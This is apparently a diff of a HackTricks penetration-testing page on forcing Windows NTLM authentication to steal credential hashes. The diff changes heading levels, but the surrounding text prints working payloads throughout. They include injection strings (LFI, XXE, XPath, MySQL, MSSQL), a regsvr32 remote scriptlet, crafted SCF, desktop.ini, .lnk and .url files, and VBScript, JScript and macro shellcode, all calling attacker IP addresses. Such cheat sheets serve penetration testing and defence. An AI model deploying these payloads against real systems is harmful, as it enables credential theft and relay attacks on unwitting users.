@@ -17,15 +17,13 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# Places to steal NTLM creds
+# Automatic Payloads Creation & Other lists
 
-## Automatic Payloads Creation & Other lists
-
-### [ntlm\_theft](https://github.com/Greenwolf/ntlm_theft)
+## [ntlm\_theft](https://github.com/Greenwolf/ntlm_theft)
 
 This tool will **create several documents/files** that if accessed by the user somehow they will **start a NTLM authentication with the attacker**.
 
-#### ntlm\_theft supports the following attack types:
+### ntlm\_theft supports the following attack types:
 
 Browse to Folder Containing:
 
@@ -90,19 +88,19 @@ Click Link in Chat Program:
 > Generation Complete.
 > ```
 
-### [All\_NTLM-Leak](https://github.com/Gl3bGl4z/All_NTLM_leak)
+## [All\_NTLM-Leak](https://github.com/Gl3bGl4z/All_NTLM_leak)
 
 > Cheatsheet
 
 This is a list of techniques to force NTLM authentications to steal credentials from the victim.
 
-### Force NTLM Privileged Authentication
+## Force NTLM Privileged Authentication
 
 You may be able to **force a windows machine to authenticate to an arbitrary machine** using a privileged account. Read the following page to learn more:
 
 {% page-ref page="../active-directory-methodology/printers-spooler-service-abuse.md" %}
 
-## LFI
+# LFI
 
 The include\(\) in PHP will resolve the network path for us.
 
@@ -112,7 +110,7 @@ http://host.tld/?page=//11.22.33.44/@OsandaMalith
 
 ![](https://osandamalith.files.wordpress.com/2017/03/lfi.png?w=640)
 
-## XXE
+# XXE
 
 In here I’m using “php://filter/convert.base64-encode/resource=” that will resolve a network path.
 
@@ -130,7 +128,7 @@ In here I’m using “php://filter/convert.base64-encode/resource=” that will
 
 ![](https://osandamalith.files.wordpress.com/2017/03/xxe.png?w=640)
 
-## XPath Injection
+# XPath Injection
 
 Usually, doc\(\) is used in out-of-band XPath injections, thus can be applied in resolving a network path.
 
@@ -140,7 +138,7 @@ http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@
 
 ![](https://osandamalith.files.wordpress.com/2017/03/xpath.png?w=640)
 
-## MySQL Injection
+# MySQL Injection
 
 I have written a complete [post ](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)on MySQL out-of-band injections which can be applied over the internet. You can also use ‘INTO OUTFILE’ to resolve a network path.
 
@@ -150,7 +148,7 @@ http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.10
 
 ![](https://osandamalith.files.wordpress.com/2017/02/overinternet.png?w=640)
 
-## MSSQL
+# MSSQL
 
 Since stacked queries are supported we can call stored procedures.
 
@@ -158,7 +156,7 @@ Since stacked queries are supported we can call stored procedures.
 ';declare @q varchar(99);set @q='\\192.168.254.52\test'; exec master.dbo.xp_dirtree @q
 ```
 
-## Regsvr32
+# Regsvr32
 
 Accidently found this one while experimenting with .sct files.
 
@@ -168,7 +166,7 @@ regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll
 
 ![](https://osandamalith.files.wordpress.com/2017/03/regsvr32.png?w=640)
 
-## Batch
+# Batch
 
 There are many possible ways you can explore
 
@@ -186,7 +184,7 @@ find, findstr, [x]copy, move, replace, del, rename and many more!
 
 ![](https://osandamalith.files.wordpress.com/2017/03/batch.png?w=640)
 
-## Auto-Complete
+# Auto-Complete
 
 You just need to type ‘\host\’ the auto-complete will do the trick under the explorer and the run dialog box.
 
@@ -194,7 +192,7 @@ You just need to type ‘\host\’ the auto-complete will do the trick under the
 
 ![](https://osandamalith.files.wordpress.com/2017/03/run.png?w=640)
 
-## Autorun.inf
+# Autorun.inf
 
 Starting from Windows 7 this feature is disabled. However you can enable by changing the group policy for Autorun. Make sure to hide the Autorun.inf file to work.
 
@@ -205,7 +203,7 @@ icon=something.ico
 action=open Setup.exe
 ```
 
-## Shell Command Files
+# Shell Command Files
 
 It is possible to obtain passwords hashes of domain users or shells when writing permissions given to unauthenticated users. SCF \(Shell Command Files\) can perform a limited set of operations like showing the Windows desktop or opening a Windows Explorer. Save the code below as `ordinary.scf` and put it into a network share.
 
@@ -217,7 +215,7 @@ IconFile=\\AttackerIP\ordinary.ico
 Command=ToggleDesktop
 ```
 
-## Desktop.ini
+# Desktop.ini
 
 The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes.
 
@@ -238,7 +236,7 @@ IconFile=\\192.168.0.1\aa
 IconIndex=1337
 ```
 
-## Shortcut Files \(.lnk\)
+# Shortcut Files \(.lnk\)
 
 We can create a shortcut containing our network path and as you as you open the shortcut Windows will try to resolve the network path. You can also specify a keyboard shortcut to trigger the shortcut. For the icon you can give the name of a Windows binary or choose an icon from either shell32.dll, Ieframe.dll, imageres.dll, pnidui.dll or wmploc.dll located in the system32 directory.
 
@@ -272,7 +270,7 @@ $lnk.Save()
 
 ![](https://osandamalith.files.wordpress.com/2017/03/shortcut2.png?w=640)
 
-## Internet Shortcuts \(.url\)
+# Internet Shortcuts \(.url\)
 
 Another shortcut in Windows is the Internet shortcuts. You can save this as something.url
 
@@ -281,7 +279,7 @@ echo [InternetShortcut] > stealMyHashes.url
 echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
 ```
 
-## Autorun with Registry
+# Autorun with Registry
 
 You can add a new registry key in any of the following paths.
 
@@ -294,7 +292,7 @@ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
 
 ![](https://osandamalith.files.wordpress.com/2017/03/registry.png?w=640)
 
-## Powershell
+# Powershell
 
 There are probably many scriptlets in Powershell that would resolve a network path.
 
@@ -304,7 +302,7 @@ Get-Content \\192.168.0.1\aa
 Start-Process \\192.168.0.1\aa
 ```
 
-## IE
+# IE
 
 IE will resolve UNC paths. For example
 
@@ -318,7 +316,7 @@ You can inject under XSS or in scenarios you find SQL injection. For example.
 http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00
 ```
 
-## VBScript
+# VBScript
 
 You can save this as .vbs or can be used inside a macro that is applied to Word or Excel files.
 
@@ -358,7 +356,7 @@ You can apply this in html files too. But only works with IE. You can save this 
 </html>
 ```
 
-## JScript
+# JScript
 
 You can save this as something.js under windows.
 
@@ -398,7 +396,7 @@ The html version of this.
 </html>
 ```
 
-## Windows Script Files
+# Windows Script Files
 
 Save this as something.wsf.
 
@@ -413,7 +411,7 @@ Save this as something.wsf.
 </package>
 ```
 
-## Shellcode
+# Shellcode
 
 Here’s a small shellcode I made. This shellcode uses CreateFile and tries to read a non-existing network path. You can use tools such as Responder to capture NetNTLM hashes. The shellcode can be modified to steal hashes over the internet. SMBRelay attacks can also be performed.
 
@@ -478,7 +476,7 @@ int main() {
 
 ![](https://osandamalith.files.wordpress.com/2017/03/overintenert1.png?w=640)
 
-## Shellcode Inside Macros
+# Shellcode Inside Macros
 
 Here’s the above shellcode applied inside a Word/Excel macro. You can use the same code inside a VB6 application.
 
@@ -578,14 +576,14 @@ End Sub
 
 [https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba)
 
-## Shellcode Inside VBS and JS
+# Shellcode Inside VBS and JS
 
 subTee has done many kinds of research with JS and DynamicWrapperX. You can find a POC using the DynamicWrapperX DLL.  
 [http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html](http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html)  
 Based on that I have ported the shellcode to JS and VBS. The fun part is we can embed shellcode in JScript or VBScript inside html and .hta formats.  
 Note the following shellcode directs to my IP.
 
-#### JScript
+### JScript
 
 ```text
 /*
@@ -631,7 +629,7 @@ var thread = DX.CreateThread(0,0,scLocation,0,0);
 
 [https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js)
 
-#### VBScript
+### VBScript
 
 ```text
 ' Author : Osanda Malith Jayathissa (@OsandaMalith)
@@ -682,7 +680,7 @@ thread = DX.CreateThread (0,0,scLocation,0,0)
 
 There might be many other ways in Windows. You never know! 🙂
 
-## References
+# References
 
 * [**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/**](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
 * [https://attack.mitre.org/techniques/T1187/](https://attack.mitre.org/techniques/T1187/)
